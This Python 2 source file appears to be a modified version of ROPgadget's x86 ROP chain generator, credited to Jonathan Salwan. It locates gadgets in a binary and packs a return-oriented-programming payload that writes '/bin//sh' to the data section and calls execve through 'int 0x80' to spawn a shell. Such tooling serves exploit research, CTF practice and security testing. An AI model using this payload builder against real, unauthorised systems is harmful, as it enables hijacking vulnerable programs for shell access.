#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#  Jonathan Salwan - 2014-05-13
#
#  http://shell-storm.org
#  http://twitter.com/JonathanSalwan
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software  Foundation, either  version 3 of  the License, or
#  (at your option) any later version.
#

import re
from struct import pack
import ROPgadget.ropgadget.ropchain.ropmaker


class ROPMakerX86:
    def __init__(self, data_section, gadgets, liboffset=0x0, verbose=False):
        self.__gadgets = gadgets
        self.__data_section = data_section
        # If it's a library, we have the option to add an offset to the addresses
        self.__liboffset = liboffset
        self.__verbose = verbose

    def __lookingForWrite4Where(self, gadgetsAlreadyTested):
        for gadget in self.__gadgets:
            if gadget in gadgetsAlreadyTested:
                continue
            f = gadget["gadget"].split(" ; ")[0]
            # regex -> mov dword ptr [r32], r32
            regex = re.search(
                "mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$",
                f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]
                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    if self.__verbose:
                        print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return [gadget, regex.group("dst"), regex.group("src")]
                except:
                    continue
        return None

    def __lookingForSomeThing(self, something):
        for gadget in self.__gadgets:
            lg = gadget["gadget"].split(" ; ")
            if lg[0] == something:
                try:
                    for g in lg[1:]:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    if self.__verbose:
                        print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return gadget
                except:
                    continue
        return None

    def __padding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        padding_string = ''
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    padding_string += (
                        pack('<I', regAlreadSetted[reg])) # padding without overwrite %s\n" % (, reg))
                except KeyError:
                    padding_string += pack('<I', 0x41414141) # padding\n"
        return padding_string

    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
        section = self.__data_section
        dataAddr = section["vaddr"] + self.__liboffset
        godgets_in_stack = ''

        godgets_in_stack += pack('<I', popDst["vaddr"]) # %s\n" % (popDst["vaddr"], popDst["gadget"]))
        godgets_in_stack += pack('<I', dataAddr) # @ .data\n" % )
        godgets_in_stack += self.__padding(popDst, {})

        godgets_in_stack += pack('<I', popSrc["vaddr"]) # %s\n" % (popSrc["vaddr"], popSrc["gadget"]))
        godgets_in_stack += '/bin'
        godgets_in_stack += self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        godgets_in_stack += pack('<I', write4where["vaddr"]) # %s\n" % (write4where["vaddr"], write4where["gadget"]))
        godgets_in_stack += self.__padding(write4where, {})

        godgets_in_stack += pack('<I', popDst["vaddr"]) # %s\n" % (popDst["vaddr"], popDst["gadget"]))
        godgets_in_stack += pack('<I', (dataAddr + 4)) # @ .data + 4\n" % (dataAddr + 4))
        godgets_in_stack += self.__padding(popDst, {})

        godgets_in_stack += pack('<I', popSrc["vaddr"]) # %s\n" % (popSrc["vaddr"], popSrc["gadget"]))
        godgets_in_stack += '//sh'
        godgets_in_stack += self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 4})  # Don't overwrite reg dst

        godgets_in_stack += pack('<I', write4where["vaddr"]) # %s\n" % (write4where["vaddr"], write4where["gadget"]))
        godgets_in_stack += self.__padding(write4where, {})

        godgets_in_stack += pack('<I', popDst["vaddr"]) # %s\n" % (popDst["vaddr"], popDst["gadget"]))
        godgets_in_stack += pack('<I', (dataAddr + 8)) # @ .data + 8\n" % (dataAddr + 8))
        godgets_in_stack += self.__padding(popDst, {})

        godgets_in_stack += pack('<I', xorSrc["vaddr"]) # %s\n" % (xorSrc["vaddr"], xorSrc["gadget"]))
        godgets_in_stack += self.__padding(xorSrc, {})

        godgets_in_stack += pack('<I', write4where["vaddr"]) # %s\n" % (write4where["vaddr"], write4where["gadget"]))
        godgets_in_stack += self.__padding(write4where, {})

        godgets_in_stack += pack('<I', popEbx["vaddr"]) # %s\n" % (popEbx["vaddr"], popEbx["gadget"]))
        godgets_in_stack += pack('<I', dataAddr) # @ .data\n" % dataAddr)
        godgets_in_stack += self.__padding(popEbx, {})

        godgets_in_stack += pack('<I', popEcx["vaddr"]) # %s\n" % (popEcx["vaddr"], popEcx["gadget"]))
        godgets_in_stack += pack('<I', (dataAddr + 8)) # @ .data + 8\n" % (dataAddr + 8))
        godgets_in_stack += self.__padding(popEcx, {"ebx": dataAddr})  # Don't overwrite ebx

        godgets_in_stack += pack('<I', popEdx["vaddr"]) # %s\n" % (popEdx["vaddr"], popEdx["gadget"]))
        godgets_in_stack += pack('<I', (dataAddr + 8)) # @ .data + 8\n" % (dataAddr + 8))
        godgets_in_stack += self.__padding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        godgets_in_stack += pack('<I', xorEax["vaddr"]) # %s\n" % (xorEax["vaddr"], xorEax["gadget"]))
        godgets_in_stack += self.__padding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        for i in range(11):
            godgets_in_stack += pack('<I', incEax["vaddr"]) # %s\n" % (incEax["vaddr"], incEax["gadget"]))
            godgets_in_stack += self.__padding(incEax,
                                           {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        godgets_in_stack += pack('<I', syscall["vaddr"]) # %s\n" % (syscall["vaddr"], syscall["gadget"]))
        return ''.join(godgets_in_stack)

    def generate(self):

        # To find the smaller gadget
        self.__gadgets.reverse()
        if self.__verbose:
            print("\nx86 ROP chain generation\n===========================================================")

            print("\n- Step 1 -- Write-what-where gadgets\n")

        gadgetsAlreadyTested = []
        while True:
            write4where = self.__lookingForWrite4Where(gadgetsAlreadyTested)
            if not write4where:
                raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                    "\t[-] Can't find the 'mov dword ptr [r32], r32' gadget")

            popDst = self.__lookingForSomeThing("pop %s" % (write4where[1]))
            if not popDst:
                if self.__verbose:
                    print(
                        "\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % (write4where[1]))
                gadgetsAlreadyTested += [write4where[0]]
                continue

            popSrc = self.__lookingForSomeThing("pop %s" % (write4where[2]))
            if not popSrc:
                if self.__verbose:
                    print(
                        "\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % (write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue

            xorSrc = self.__lookingForSomeThing("xor %s, %s" % (write4where[2], write4where[2]))
            if not xorSrc:
                if self.__verbose:
                    print("\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [r], r'\n" % (
                        write4where[2], write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue
            else:
                break

        if self.__verbose:
            print("\n- Step 2 -- Init syscall number gadgets\n")

        xorEax = self.__lookingForSomeThing("xor eax, eax")
        if not xorEax:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'xor eax, eax' instuction")

        incEax = self.__lookingForSomeThing("inc eax")
        if not incEax:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'inc eax' instuction")

        if self.__verbose:
            print("\n- Step 3 -- Init syscall arguments gadgets\n")

        popEbx = self.__lookingForSomeThing("pop ebx")
        if not popEbx:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'pop ebx' instruction")

        popEcx = self.__lookingForSomeThing("pop ecx")
        if not popEcx:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'pop ecx' instruction")

        popEdx = self.__lookingForSomeThing("pop edx")
        if not popEdx:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'pop edx' instruction")

        if self.__verbose:
            print("\n- Step 4 -- Syscall gadget\n")

        syscall = self.__lookingForSomeThing("int 0x80")
        if not syscall:
            raise ROPgadget.ropgadget.ropchain.ropmaker.NotEnoughGadgetError(
                "\t[-] Can't find the 'syscall' instruction")

        if self.__verbose:
            print("\n- Step 5 -- Build the ROP chain\n")

        payload_code = self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx,
                                            popEdx, syscall)
        return payload_code
